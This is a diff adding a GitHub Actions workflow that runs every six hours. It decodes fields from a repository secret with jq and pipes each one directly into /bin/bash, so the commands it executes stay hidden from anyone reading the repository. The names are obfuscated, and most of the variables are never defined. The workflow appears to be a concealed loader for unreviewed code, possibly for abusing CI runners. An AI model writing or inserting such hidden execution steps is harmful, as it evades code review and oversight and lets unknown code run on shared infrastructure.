@@ -1,0 +1,30 @@
+name: zhuiminzhenshi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuiminzhenshi
+        env:
+          gsab3432: ${{ secrets.gsab3432 }}
+        run: |
+          echo $gsab3432 | jq -r .hfh06163 | /bin/bash
+          echo $t4017 | jq -r .s07220 | /bin/bash
+          echo $m3 | jq -r .wqah168 | /bin/bash
+          echo $oy0450 | jq -r .a76 | /bin/bash
+          echo $ekz3 | jq -r .uoqnf12116 | /bin/bash
+          echo $mzylr0452 | jq -r .sfivs43 | /bin/bash
+          echo $yk8 | jq -r .n85 | /bin/bash
+          echo $a51 | jq -r .tdfcw2014 | /bin/bash
+          echo $t08869 | jq -r .g0205 | /bin/bash
+          echo $i0 | jq -r .auqcz92812 | /bin/bash
+          echo $p463 | jq -r .ucq9365 | /bin/bash
+          echo $ng33662 | jq -r .nwy1 | /bin/bash
+          echo $uwglo9 | jq -r .a85188 | /bin/bash
+
